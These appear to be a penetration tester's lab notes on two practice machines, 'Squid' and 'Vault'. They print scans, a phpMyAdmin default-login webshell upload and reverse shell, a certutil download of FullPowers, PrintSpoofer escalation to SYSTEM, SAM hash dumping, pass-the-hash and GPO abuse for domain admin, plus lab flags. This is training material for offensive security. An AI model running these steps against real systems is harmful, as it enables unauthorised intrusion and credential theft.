@@ -1,0 +1,670 @@
+┌──(kali㉿kali)-[~/squid]
+└─$ sudo nmap -sV -sC -A -Pn -sT -T5 192.168.222.189 -p 1-65300
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 13:53 CEST
+Nmap scan report for 192.168.222.189
+Host is up (0.060s latency).
+Not shown: 65294 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3128/tcp  open  http-proxy    Squid http proxy 4.14
+|_http-server-header: squid/4.14
+|_http-title: ERROR: The requested URL could not be retrieved
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -13s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-07-05T11:56:24
+|_  start_date: N/A
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   62.44 ms 192.168.45.1
+2   62.06 ms 192.168.45.254
+3   63.13 ms 192.168.251.1
+4   67.51 ms 192.168.222.189
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 231.46 seconds
+
+Port 3128 is running a http proxy which means it is channelling a http traffic to a web application running behind it.
+
+I used this method to discorver the web applicatio running behind it https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/squid_pivot_scanning.rb
+
+[*] Starting persistent handler(s)...
+msf6 > search squid
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank    Check  Description
+   -  ----                                         ---------------  ----    -----  -----------
+   0  exploit/linux/proxy/squid_ntlm_authenticate  2004-06-08       great   No     Squid NTLM Authenticate Overflow
+   1  auxiliary/scanner/http/squid_pivot_scanning  .                normal  No     Squid Proxy Port Scanner
+   2  auxiliary/dos/http/squid_range_dos           2021-05-27       normal  No     Squid Proxy Range Header DoS
+
+
+Interact with a module by name or index. For example info 2, use 2 or use auxiliary/dos/http/squid_range_dos
+
+msf6 > use 1
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > options
+
+Module options (auxiliary/scanner/http/squid_pivot_scanning):
+
+   Name          Current Setting                                  Required  Description
+   ----          ---------------                                  --------  -----------
+   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
+   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
+   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RANGE                                                          yes       IPs to scan through Squid proxy
+   RHOSTS                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
+                                                                            oit.html
+   RPORT         80                                               yes       The target port (TCP)
+   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
+   THREADS       1                                                yes       The number of concurrent threads (max one per host)
+   VHOST                                                          no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > set CANARY_IP 192.168.222.189
+CANARY_IP => 192.168.222.189
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > set range 192.168.222.189
+range => 192.168.222.189
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > set rhost 192.168.222.189
+rhost => 192.168.222.189
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > set rport 3128
+rport => 3128
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > options
+
+Module options (auxiliary/scanner/http/squid_pivot_scanning):
+
+   Name          Current Setting                                  Required  Description
+   ----          ---------------                                  --------  -----------
+   CANARY_IP     192.168.222.189                                  yes       The IP to check if the proxy always answers positively; the IP should not respond.
+   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
+   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RANGE         192.168.222.189                                  yes       IPs to scan through Squid proxy
+   RHOSTS        192.168.222.189                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
+                                                                            oit.html
+   RPORT         3128                                             yes       The target port (TCP)
+   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
+   THREADS       1                                                yes       The number of concurrent threads (max one per host)
+   VHOST                                                          no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/squid_pivot_scanning) > run
+[+] [192.168.222.189] 192.168.222.189 is alive.
+[+] [192.168.222.189] 192.168.222.189:8080 seems open (HTTP 200, server header: 'Apache/2.4.46 (Win64) PHP/7.3.21').
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+# I went to the foxyproxy on my broweser and added a new configuration for 192.168.222.189:3128, then i used it to access the application behind it which is running at 192.168.222.189:8080
+The webapplication is running phpMyAdmin.
+
+Clicking on phpinfo http://192.168.222.189:8080/?phpinfo=-1 I was able to discover the location of the temp director 	C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp 
+Also the directory hosting the applicaion C:/wamp/www
+
+I logged in to the phpMyAdmin console with the default username root with no password.
+I needed to create an upload directory where I can upload my payload. This helped me https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
+
+I copied the command and paste it on the SQL console and executed, it created an upload directory on the server.
+I navigated to http://192.168.222.189:8080/uploader.php and was presented with an upload interface.
+
+I used this windows reverse shell payload https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php 
+I modified the code to suit the environment by replacing the temp director location on the code.
+
+I uploaded it to the server, and navigating to http://192.168.222.189:8080/shell.php on the browser gave returned a reverse shell to my kali as NT Authority\local Service
+
+──(kali㉿kali)-[~/squid]
+└─$ sudo rlwrap nc -lnvp 1234
+[sudo] password for kali: 
+listening on [any] 1234 ...
+connect to [192.168.45.180] from (UNKNOWN) [192.168.222.189] 50471
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp>whoami
+whoami
+nt authority\local service
+
+C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp>hostname
+hostname
+SQUID
+
+C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID     
+========================== ========
+nt authority\local service S-1-5-19
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                                                              Attributes                                        
+====================================== ================ ================================================================================================ ==================================================
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
+Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+More research on this windows account shows that it can forcefully get back it's seeimpersonation privilege https://itm4n.github.io/localservice-privileges/. 
+I used this tool from  https://github.com/itm4n/FullPowers/releases to achieve that
+
+PS C:\users\public> certutil -urlcache -split -f http://192.168.45.180/FullPowers.exe
+certutil -urlcache -split -f http://192.168.45.180/FullPowers.exe
+****  Online  ****
+  0000  ...
+  9000
+CertUtil: -URLCache command completed successfully.
+PS C:\users\public> .\FullPowers.exe
+.\FullPowers.exe
+[+] Started dummy thread with id 1032
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID     
+========================== ========
+nt authority\local service S-1-5-19
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                                                              Attributes                                        
+====================================== ================ ================================================================================================ ==================================================
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
+Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-87-343222087-845000640-1675840783-1352364494-2876961185                                    Enabled by default, Enabled group, Group owner    
+LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+
+I tried to use printspoofer and sweetpotato with nc.exe to get another shell on another port on the target but none worked. 
+I just used printspoofer to open a new shell on the target and it worked.
+
+C:\Users\Public>.\PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+SQUID
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>cd administrator
+cd administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir proof.txt
+dir proof.txt
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/05/2025  04:52 AM                34 proof.txt
+               1 File(s)             34 bytes
+               0 Dir(s)  13,629,362,176 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+be6c52688b9fd7331878c575d61258a1
+
+C:\Users\Administrator\Desktop>
+
+
+#Vault
+
+┌──(kali㉿kali)-[~/vault]
+└─$ sudo nmap -sV -sC -A -Pn -sT -T5 192.168.147.172 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 07:57 CEST
+Warning: 192.168.147.172 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.147.172
+Host is up (0.055s latency).
+Not shown: 65279 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-08 06:00:43Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC.vault.offsec
+| Not valid before: 2025-07-07T05:56:46
+|_Not valid after:  2026-01-06T05:56:46
+| rdp-ntlm-info: 
+|   Target_Name: VAULT
+|   NetBIOS_Domain_Name: VAULT
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: vault.offsec
+|   DNS_Computer_Name: DC.vault.offsec
+|   DNS_Tree_Name: vault.offsec
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-08T06:01:36+00:00
+|_ssl-date: 2025-07-08T06:02:16+00:00; +56s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+49811/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-08T06:01:38
+|_  start_date: N/A
+|_clock-skew: mean: 55s, deviation: 0s, median: 55s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   56.22 ms 192.168.45.1
+2   55.14 ms 192.168.45.254
+3   57.51 ms 192.168.251.1
+4   61.34 ms 192.168.147.172
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 260.61 seconds
+
+
+Their is an assume breached creds that was able to grant me access via winrm. The user have sebackupprivilege but I could not use it even after saving the sam and system file and extracting the hashes
+
+┌──(kali㉿kali)-[~/vault]
+└─$ nxc winrm 192.168.147.172 -u anirudh -p SecureHM 
+WINRM       192.168.147.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.147.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/vault]
+└─$ evil-winrm -i 192.168.147.172 -u anirudh -p 'SecureHM'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami
+vault\anirudh
+*Evil-WinRM* PS C:\Users\anirudh\Documents> hostname
+DC
+*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
+*Evil-WinRM* PS C:\Users\anirudh> ls
+
+*Evil-WinRM* PS C:\Program Files> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ============================================
+vault\anirudh S-1-5-21-537427935-490066102-1511301751-1103
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+*Evil-WinRM* PS C:\users\anirudh> reg save hklm\sam c:\users\anirudh\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\users\anirudh> reg save hklm\system c:\users\anirudh\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\users\anirudh> download sam
+                                        
+Info: Downloading C:\users\anirudh\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\users\anirudh> download system
+
+┌──(kali㉿kali)-[~/vault]
+└─$ sudo impacket-secretsdump -sam sam -system system LOCAL
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up... 
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/vault]
+└─$ nxc winrm 192.168.147.172 -u administrator -H 608339ddc8f434ac21945e026887dc36
+WINRM       192.168.147.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.147.172 5985   DC               [-] vault.offsec\administrator:608339ddc8f434ac21945e026887dc36
+
+
+I tried other methods like enumerating users and shares, ldapsearch. However, none yielded any good result.
+I moved bloodhound and discover that the user have write access to the "default domain policy".
+
+I used this tool SharpGPOAbuse.exe to add the user to the admin group
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\users\anirudh> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+[+] Domain = vault.offsec
+[+] Domain Controller = DC.vault.offsec
+[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+
+
+#I had to login with the user via another winrm shell and I was presented with the admin right
+
+┌──(kali㉿kali)-[~/vault]
+└─$ evil-winrm -i 192.168.147.172 -u anirudh -p 'SecureHM'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ============================================
+vault\anirudh S-1-5-21-537427935-490066102-1511301751-1103
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ===============================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+*Evil-WinRM* PS C:\Users\anirudh\Documents> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            anirudh                  Guest
+krbtgt
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> net user anirudh
+User name                    anirudh
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/19/2021 1:59:51 AM
+Password expires             Never
+Password changeable          11/20/2021 1:59:51 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   8/1/2024 7:10:30 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
+*Evil-WinRM* PS C:\Users\anirudh> cd ..
+*Evil-WinRM* PS C:\Users> cd administrator
+*Evil-WinRM* PS C:\Users\administrator> ls
+
+
+    Directory: C:\Users\administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       11/19/2021  12:04 AM                3D Objects
+d-r---       11/19/2021  12:04 AM                Contacts
+d-r---       11/19/2021   1:10 AM                Desktop
+d-r---       11/19/2021  12:04 AM                Documents
+d-r---       11/19/2021  12:04 AM                Downloads
+d-r---       11/19/2021  12:04 AM                Favorites
+d-r---       11/19/2021  12:04 AM                Links
+d-r---       11/19/2021  12:04 AM                Music
+d-r---       11/19/2021  12:04 AM                Pictures
+d-r---       11/19/2021  12:04 AM                Saved Games
+d-r---       11/19/2021  12:04 AM                Searches
+d-r---       11/19/2021  12:04 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\administrator\Desktop> ls
+
+
+    Directory: C:\Users\administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         7/7/2025  10:57 PM             34 proof.txt
+
+
+*Evil-WinRM* PS C:\Users\administrator\Desktop> cat proof.txt
+dec65183ed90f286c4b486b59995f6a4
+*Evil-WinRM* PS C:\Users\administrator\Desktop> 
+
+
+
+
+
+
